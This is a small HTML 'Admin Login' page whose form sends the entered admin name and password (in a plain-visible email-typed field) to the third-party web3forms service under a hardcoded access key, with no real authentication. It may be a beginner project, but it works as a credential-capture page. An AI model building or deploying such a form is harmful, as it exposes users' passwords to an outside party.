<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=<device-width>, initial-scale=1.0">
    <link rel="stylesheet" href="style1.css">
    <title>Admin Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body>
    <div class="container">
        <div class="myform">
            
            <form action="https://api.web3forms.com/submit" method="POST">

                <!-- Replace with your Access Key -->
                <input type="hidden" name="access_key" value="349d0a38-c050-443a-9d41-73c277d7f537">
            
                <!-- Form Inputs. Each input must have a name="" attribute -->
                <input type="text" name="name" required placeholder="Admin Name">
                <input type="email" name="email" required placeholder="Password">
              
                <!-- Honeypot Spam Protection -->
                <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
            
                <!-- Custom Confirmation / Success Page -->
                <!-- <input type="hidden" name="redirect" value="https://mywebsite.com/thanks.html"> -->
            
                <button type="submit">LOGIN</button>
            
            </form>

        </div>
        <div class="image">
            <img src="https://static.vecteezy.com/system/resources/previews/014/048/888/non_2x/a-young-woman-secretary-working-at-the-computer-in-office-workflow-process-administrative-administration-business-administration-illustrated-by-vector.jpg"
                width="300px">

        </div>
    </div>
</body>

</html>
